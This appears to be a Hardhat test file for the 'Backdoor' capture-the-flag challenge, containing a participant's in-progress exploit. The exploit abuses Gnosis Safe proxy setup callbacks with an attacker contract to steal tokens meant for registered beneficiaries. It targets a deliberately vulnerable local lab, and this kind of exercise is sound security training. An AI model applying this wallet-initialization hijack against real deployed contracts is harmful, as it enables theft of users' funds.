const { ethers } = require('hardhat');
const { expect } = require('chai');

const calculateProxyAddress = async (factory, singleton, inititalizer, nonce) => {
    const deploymentCode = ethers.utils.solidityPack(["bytes", "uint256"], [await factory.proxyCreationCode(), singleton]);
    const salt = ethers.utils.solidityKeccak256(["bytes32", "uint256"], [ethers.utils.solidityKeccak256(["bytes"], [inititalizer]), nonce]);
    return ethers.utils.getCreate2Address(factory.address, salt, ethers.utils.keccak256(deploymentCode));
};

const calculateProxyAddressWithCallback = async (factory, singleton, inititalizer, nonce, callback) => {
    const saltNonceWithCallback = ethers.utils.solidityKeccak256(["uint256", "address"], [nonce, callback]);
    return (0, calculateProxyAddress)(factory, singleton, inititalizer, saltNonceWithCallback);
};

describe('[Challenge] Backdoor', function () {
    let deployer, users, attacker;

    const AMOUNT_TOKENS_DISTRIBUTED = ethers.utils.parseEther('40');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, alice, bob, charlie, david, attacker] = await ethers.getSigners();
        users = [alice.address, bob.address, charlie.address, david.address]

        // Deploy Gnosis Safe master copy and factory contracts
        this.masterCopy = await (await ethers.getContractFactory('GnosisSafe', deployer)).deploy();
        this.walletFactory = await (await ethers.getContractFactory('GnosisSafeProxyFactory', deployer)).deploy();
        this.token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        
        // Deploy the registry
        this.walletRegistry = await (await ethers.getContractFactory('WalletRegistry', deployer)).deploy(
            this.masterCopy.address,
            this.walletFactory.address,
            this.token.address,
            users
        );

        // Users are registered as beneficiaries
        for (let i = 0; i < users.length; i++) {
            expect(
                await this.walletRegistry.beneficiaries(users[i])
            ).to.be.true;            
        }

        // Transfer tokens to be distributed to the registry
        await this.token.transfer(this.walletRegistry.address, AMOUNT_TOKENS_DISTRIBUTED);
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
        this.aaron = await (await ethers.getContractFactory('AaronPwn', deployer)).deploy();
        //this.aaron.pwn();
        //let callback = await hre.ethers.getContractAt("IProxyCreationCallback", mock.address)

        // Get attacker module creation data.
        // Note that the module will be behind a proxy
        /*const controllerModuleCreationData = this.proxyFactory.contract.methods.createProxy(
            this.aaron.address,
            this.aaron.contract.methods.setup().encodeABI()
        ).encodeABI();

        const createAndAddModulesData = this.createAndAddModules.contract.methods.createAndAddModules(
            this.proxyFactory.address,
            utils.createAndAddModulesData([controllerModuleCreationData])
        ).encodeABI();*/


        //console.log(new ethers.utils.Interface(['function setup(address[],uint256,address,bytes,address,address,uint256,address)']));
        for (var i = 0; i < users.length; i++) {
            console.log('aaron address:', this.aaron.address);
            console.log('attacker address:', attacker.address);
            var initCode = this.aaron.interface.encodeFunctionData('setup', [
                [users[i]],
                1,
                this.aaron.address,//attacker.address,
                new ethers.utils.Interface(['function test(address)']).encodeFunctionData('test', [this.aaron.address]),//"0x",
                attacker.address,
                attacker.address,
                123,
                attacker.address
            ]);
            //initCode += initCode;

            // TODO: try concatenating multiple setup functions and see if you can do that

            /*const initCode = new ethers.utils.Interface([
                'function drainAllFunds(address receiver)'
            ]).encodeFunctionData('drainAllFunds', [attacker.address]);*/
            const saltNonce = 0xdeadbeef;

            //const proxyAddress = await calculateProxyAddressWithCallback(this.walletFactory.address, this.walletRegistry.address, initCode, saltNonce, this.masterCopy.address)
            const proxy = await this.walletFactory.createProxyWithCallback(this.masterCopy.address, initCode, saltNonce, this.walletRegistry.address);
            //await proxy.
            await this.aaron.connect(attacker).stealMoney(this.walletRegistry.address, users[i], this.token.address);
        }
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        for (let i = 0; i < users.length; i++) {
            console.log("CHECKING WALLET %d", i);
            let wallet = await this.walletRegistry.wallets(users[i]);
            
            // User must have registered a wallet
            expect(wallet).to.not.eq(ethers.constants.AddressZero, "User did not register a wallet");

            // User is no longer registered as a beneficiary
            expect(
                await this.walletRegistry.beneficiaries(users[i])
            ).to.be.false;
        }

        // Attacker must have taken all tokens
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.eq(AMOUNT_TOKENS_DISTRIBUTED);
    });
});
